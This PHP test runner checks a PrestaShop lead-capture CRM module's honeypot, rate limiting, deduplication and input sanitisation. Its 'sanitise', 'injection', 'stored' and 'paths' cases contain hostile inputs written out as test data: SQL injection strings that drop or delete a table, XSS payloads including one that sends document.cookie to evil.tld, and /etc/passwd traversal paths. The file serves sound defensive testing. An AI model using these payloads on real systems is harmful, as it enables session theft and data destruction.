<?php
/**
 * Behaviour tests for modules/odys_crm. One case per process, because the
 * capture controller ends with exit(). Usage: php run.php <case>
 */
require __DIR__ . '/stubs.php';

$MOD = getenv('ODYS_MODULE_DIR');
require $MOD . '/classes/OdysCrmLead.php';
require $MOD . '/classes/OdysCrmGuard.php';

$case = $argv[1] ?? 'help';

function report(array $extra = [])
{
    $leads = [];
    foreach (TestBus::$store as $id => $row) {
        $leads[$id] = array_intersect_key($row, array_flip(
            ['source', 'stage', 'email', 'phone', 'subject', 'hits', 'visitor', 'value', 'id_order', 'ip', 'page']
        ));
    }
    // NOT NULL columns: any null here would be rejected by a strict MySQL
    $nulls = [];
    foreach (TestBus::$store as $id => $row) {
        foreach ($row as $field => $value) {
            if ($value === null) {
                $nulls[] = $id . '.' . $field;
            }
        }
    }
    fwrite(STDERR, json_encode(array_merge([
        'output' => TestBus::$output,
        'nullFields' => $nulls,
        'leads' => $leads,
        'updates' => TestBus::$updates,
        'queries' => array_map(fn($q) => preg_replace('/\s+/', ' ', trim($q)), TestBus::$queries),
    ], $extra), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
}

register_shutdown_function('report');

function capture(array $payload, array $getValueQueue = [0])
{
    TestBus::$input = json_encode($payload);
    TestBus::$getValueQueue = $getValueQueue;
    require_once getenv('ODYS_MODULE_DIR') . '/controllers/front/capture.php';
    $c = new Odys_crmCaptureModuleFrontController();
    $c->postProcess();
}

switch ($case) {
    case 'honeypot':
        capture(['source' => 'newsletter', 'email' => 'spam@bot.tld', 'website' => 'http://spam']);
        break;

    case 'newsletter':
        capture(['source' => 'newsletter', 'email' => 'yasmine@example.ma', 'visitor' => 'abc123', 'page' => '/']);
        break;

    case 'dedupe':
        // an open lead already exists for this visitor
        TestBus::$store[7] = ['source' => 'whatsapp', 'stage' => 'new', 'email' => '', 'phone' => '',
            'subject' => 'x', 'hits' => 1, 'visitor' => 'abc123', 'value' => 0, 'id_order' => 0,
            'ip' => '41.248.10.7', 'page' => '/', 'id' => 7, 'notes' => '', 'payload' => '',
            'name' => '', 'id_shop' => 1, 'id_customer' => 0,
            'date_add' => '2026-09-01 10:00:00', 'date_upd' => '2026-09-01 10:00:00'];
        capture(['source' => 'quiz', 'visitor' => 'abc123', 'subject' => 'Famille oriental'], [0, 7]);
        break;

    case 'sanitise':
        capture([
            'source' => 'not-a-source',
            'email' => 'not-an-email',
            'phone' => '06-15 48 00 21 <script>',
            'subject' => '<script>alert(1)</script>Parfum',
            'visitor' => "abc'; DROP TABLE ps_odys_crm_lead; --",
            'page' => '/collection',
        ]);
        break;

    case 'ratelimit':
        // 20 per visitor is the tightest ceiling: the 21st must be refused,
        // and it must be refused even though every hit updates the same lead
        // (the old row-count limiter never tripped in that case).
        // The controller ends in exit(), so the loop talks to the limiter
        // itself; capture()'s use of it is covered by the live shop check.
        $accepted = 0;
        $refused = null;
        for ($i = 1; $i <= 25; ++$i) {
            list($ok, $why) = OdysCrmGuard::rateLimit('41.248.10.7', 'flood');
            if ($ok) {
                ++$accepted;
            } elseif ($refused === null) {
                $refused = ['at' => $i, 'error' => $why];
            }
        }
        // a different visitor on the same IP still gets through
        list($otherOk) = OdysCrmGuard::rateLimit('41.248.10.7', 'someone-else');
        fwrite(STDERR, "\nRATE: " . json_encode([
            'accepted' => $accepted,
            'firstRefusal' => $refused,
            'otherVisitorAllowed' => $otherOk,
        ]) . "\n");
        break;

    case 'injection':
        // SQL, XSS and traversal in every field at once
        capture([
            'source' => "quiz'; DROP TABLE ps_odys_crm_lead; --",
            'name' => '<img src=x onerror=alert(1)>Yasmine',
            'email' => "yasmine@example.ma'; DELETE FROM ps_odys_crm_lead WHERE '1'='1",
            'phone' => "0612345678' OR '1'='1",
            'subject' => '<script>fetch("//evil.tld?c="+document.cookie)</script>',
            'payload' => ['fam' => '<b>oud</b>', 'note' => "x' UNION SELECT 1,2,3 --", 'deep' => ['no']],
            'page' => 'javascript:alert(document.domain)',
            'visitor' => "abc'; DROP TABLE ps_odys_crm_lead; --",
        ]);
        break;

    case 'stored':
        // hostile values that pass validation must be stored inert, and the
        // SQL that looks them up must carry them escaped
        capture([
            'source' => 'newsletter',
            'email' => 'yasmine@example.ma',
            'name' => '<img src=x onerror=alert(1)>Yasmine',
            'subject' => '<script>alert(document.cookie)</script>Parfum',
            'payload' => ['fam' => '<b>oud</b>', 'note' => "x' UNION SELECT 1,2,3 --"],
            'page' => '/collection',
            'visitor' => "abc'; DROP TABLE ps_odys_crm_lead; --",
        ]);
        break;

    case 'paths':
        // only a path on this shop survives
        foreach (['/collection', '//evil.tld/x', 'https://evil.tld/x', '/a/../../etc/passwd', "/ok\x00bad"] as $p) {
            fwrite(STDERR, sprintf("PATH %-24s -> %s\n", json_encode($p), json_encode(OdysCrmGuard::cleanPath($p))));
        }
        fwrite(STDERR, 'EMAIL ' . json_encode([
            OdysCrmGuard::cleanEmail('yasmine@example.ma'),
            OdysCrmGuard::cleanEmail('yasmine@example'),
            OdysCrmGuard::cleanEmail(['array']),
        ]) . "\n");
        fwrite(STDERR, 'PHONE ' . json_encode([
            OdysCrmGuard::cleanPhone('+212 612345678'),
            OdysCrmGuard::cleanPhone('12'),
            OdysCrmGuard::cleanPhone("0612345678' OR '1'='1"),
        ]) . "\n");
        break;

    case 'oversize':
        TestBus::$input = json_encode(['source' => 'quiz', 'visitor' => 'abc',
            'subject' => str_repeat('A', OdysCrmGuard::MAX_BODY + 10)]);
        TestBus::$getValueQueue = [0];
        require_once getenv('ODYS_MODULE_DIR') . '/controllers/front/capture.php';
        (new Odys_crmCaptureModuleFrontController())->postProcess();
        break;

    case 'empty':
        // nothing identifying and nothing typed: not a lead
        capture(['source' => 'quiz']);
        break;

    case 'badjson':
        TestBus::$input = 'not json at all';
        TestBus::$getValueQueue = [0];
        require_once getenv('ODYS_MODULE_DIR') . '/controllers/front/capture.php';
        (new Odys_crmCaptureModuleFrontController())->postProcess();
        break;

    case 'order':
        require_once getenv('ODYS_MODULE_DIR') . '/odys_crm.php';
        $m = new Odys_crm();
        $customer = new Customer();
        $customer->id = 12;
        $customer->email = 'yasmine@example.ma';
        $m->hookActionValidateOrder(['order' => new Order(), 'customer' => $customer]);
        break;

    case 'media':
        require_once getenv('ODYS_MODULE_DIR') . '/odys_crm.php';
        (new Odys_crm())->hookActionFrontControllerSetMedia();
        fwrite(STDERR, "\nJSDEF: " . json_encode(Media::$defs) . "\n");
        break;

    case 'admin':
        require_once getenv('ODYS_MODULE_DIR') . '/controllers/admin/AdminOdysCrmController.php';
        $c = new AdminOdysCrmController();
        $kpis = $c->renderKpis();
        $list = $c->renderList();
        $form = $c->renderForm();
        $stageOptions = $c->fields_form['input'][0]['options']['query'];
        fwrite(STDERR, "\nADMIN: " . json_encode([
            'columns' => array_keys($c->fields_list),
            'rowActions' => $c->actions,
            'kpis' => $kpis,
            'stageOptions' => $stageOptions,
            'labelStage(ordered)' => AdminOdysCrmController::labelStage('ordered'),
            'labelSource(quiz)' => AdminOdysCrmController::labelSource('quiz'),
            'export' => $c->allow_export,
        ], JSON_UNESCAPED_UNICODE) . "\n");
        break;

    case 'nulls':
        capture(['source' => 'whatsapp', 'visitor' => 'nul1']);
        $lead = array_values(TestBus::$store)[0] ?? [];
        $nulls = array_keys(array_filter($lead, fn($v) => $v === null));
        fwrite(STDERR, "\nNULL FIELDS: " . json_encode($nulls) . "\n");
        break;

    default:
        fwrite(STDOUT, "unknown case\n");
}
